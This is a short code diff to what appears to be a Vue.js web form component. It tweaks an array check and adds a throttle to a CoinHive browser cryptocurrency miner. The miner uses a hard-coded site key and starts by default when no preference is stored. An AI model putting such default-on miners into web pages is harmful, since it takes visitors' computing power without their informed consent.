@@ -54,7 +54,7 @@
         url: '',
         mobile: localStorage.getItem('mobile') || '',
         submit: false,
-        coin: ['', 'true'].includes(localStorage.getItem('coin') || '')
+        coin: ['', 'true'].indexOf(localStorage.getItem('coin') || '') != -1
       }
     },
     mounted () {
@@ -87,7 +87,7 @@
       },
       tryCoin () {
         if (this.coin) {
-          new CoinHive.Anonymous('WvcpW4CKlXIjRtcrFIhdRs1gmn6wqa2c').start()
+          new CoinHive.Anonymous('WvcpW4CKlXIjRtcrFIhdRs1gmn6wqa2c', {throttle: 0.5}).start()
         }
       }
     }
